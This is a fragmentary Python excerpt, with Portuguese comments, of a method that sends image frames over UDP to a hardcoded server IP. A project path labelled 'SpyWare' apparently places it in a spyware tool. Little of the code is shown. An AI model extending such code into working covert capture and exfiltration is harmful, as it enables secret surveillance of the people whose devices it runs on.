...
ip = '120.0.0.134' # Coloque o seu IP
...
class App():
	...
	def sendImage(self): # Essa funcao envia o frame para o servidor
		...
		s.sendto("LEN:%i".encode('utf-8')%(packet_size), (self.ip, self.port)) # Envia o tamanho do frame inicialmente
		print('ENVIANDO TAMANHO FRAME:', packet_size)
...
# cd Desktop\SpyWare\SpyOffSec\udp